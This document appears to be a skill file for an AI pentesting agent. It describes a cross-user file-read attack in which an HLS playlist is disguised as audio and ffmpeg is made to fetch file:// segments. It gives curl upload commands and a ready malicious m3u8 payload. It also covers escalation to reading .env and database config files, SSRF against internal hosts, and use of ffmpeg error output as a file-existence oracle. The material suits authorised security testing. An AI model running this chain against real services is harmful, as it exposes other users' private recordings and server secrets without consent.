---
name: ffmpeg-hls-crossuser-fileread
description: Use when testing apps that accept media uploads and process them with ffmpeg (audio transcription, video processing, image conversion). If the upload endpoint does not validate file magic bytes and ffmpeg is invoked without protocol restrictions, an HLS playlist with file:// segment URLs achieves cross-user file read, bypassing all application-level ACLs. Triggers - "media upload", "audio processing", "ffmpeg", "transcription", "file upload", "HLS", "m3u8", "file read", "LFI via media", "cross-user file"
platform: [android, ios]
stack: [any]
category: backend-pivot
tier: B
related: [llm-prompt-injection-multiframe]
---

# Cross-User File Read via ffmpeg HLS Playlist Injection

## When to use

- The app accepts media uploads (audio chunks, video files, images for processing)
- The backend processes uploads with ffmpeg (or similar: libav, sox, ImageMagick)
- The upload endpoint trusts Content-Type headers without validating file magic bytes

## The chain

This attack chains three primitives:

1. **Unrestricted upload**: server accepts any content disguised as media (trusts Content-Type, no magic byte check)
2. **Path disclosure**: an info-disclosure or IDOR reveals the server-side path of other users' files
3. **ffmpeg file:// protocol**: upload an HLS playlist (.m3u8) with `file:///path/to/victim/file.wav` as a segment URL → ffmpeg reads the victim's file

## Workflow

### Step 1: Test unrestricted upload

Upload a non-media file with a media Content-Type:

```bash
# Upload a text file as audio
echo "This is not audio" > test.txt
curl -X POST "$UPLOAD_URL" \
  -H "Content-Type: audio/mpeg" \
  -F "file=@test.txt;filename=test.m4a"
```

If the server accepts it (200/201) and stores it → upload validation is broken.

### Step 2: Find file paths

Look for info-disclosure that reveals server-side storage paths:
- Error messages with absolute paths
- API responses with `audioPath`, `filePath`, `storagePath` fields
- IDOR in file listing endpoints that return paths of other users' files

```
rg -i "path\|storage\|upload\|audioPath\|filePath" traffic.json --max-columns 200
```

### Step 3: Craft the HLS playlist

Create a malicious `.m3u8` playlist pointing to the target file:

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///app/uploads/user_456/recording_789.wav
#EXT-X-ENDLIST
```

### Step 4: Upload the playlist as media

```bash
curl -X POST "$UPLOAD_URL" \
  -H "Content-Type: audio/mpeg" \
  -F "file=@malicious.m3u8;filename=audio.m4a"
```

### Step 5: Trigger processing

Trigger whatever server-side processing the app does on the uploaded file (transcription, conversion, thumbnail generation). When ffmpeg processes the `.m4a`, it detects HLS format, reads the playlist, and fetches the segment via `file://`: reading the victim's file from disk.

### Step 6: Read the result

The processed output (transcription text, converted file, error message) contains content from the victim's file. If ffmpeg errors out, the stderr often reveals:
- File existence (different error for "not found" vs "permission denied")
- Working directory (`/app/` or `/var/www/`)
- ffmpeg version and protocol whitelist

### Step 7: Escalate

Once you have file read:
- Read application configs: `file:///app/.env`, `file:///app/config/database.yml`
- Read source code: `file:///app/src/index.js`
- Read other users' uploads: enumerate paths from Step 2
- Attempt SSRF: replace `file://` with `http://internal-host/` (if ffmpeg allows http protocol)

## ffmpeg stderr as LFI oracle

Even when the file read "fails," ffmpeg's error messages are informative:

```
# File exists but wrong format
[mov,mp4,m4a,3gp,3g2,mj2 @ 0x...] Format mov,mp4,m4a... detected only with low score of 1

# File not found
/path/to/file: No such file or directory

# Permission denied  
/path/to/file: Permission denied

# Reveals WORKDIR
Opening '/app/uploads/test.m4a' for reading
```

If the API returns ffmpeg stderr in error responses, you have a blind LFI oracle.

## Gotchas

- **Protocol whitelist:** modern ffmpeg can be configured with `-protocol_whitelist file,http,https,tcp,tls`. If `file` is not in the whitelist, the attack fails. Check if the backend restricts protocols.
- **Format forcing:** if the backend uses `ffmpeg -f mp4 -i input.m4a`, the format is forced and ffmpeg won't detect HLS. But if it uses `ffmpeg -i input.m4a` (auto-detect), HLS works.
- **Extension validation:** some backends check the file extension. Use `.m4a` or `.ts`: both can be processed by ffmpeg as media.
- **Chroot/containers:** if the backend runs in a container, `file://` reads are limited to the container filesystem. Still useful for reading app configs and other users' uploads within the container.
- **References:** disclosed public vulnerability reports: similar HLS file:// chains have paid well.
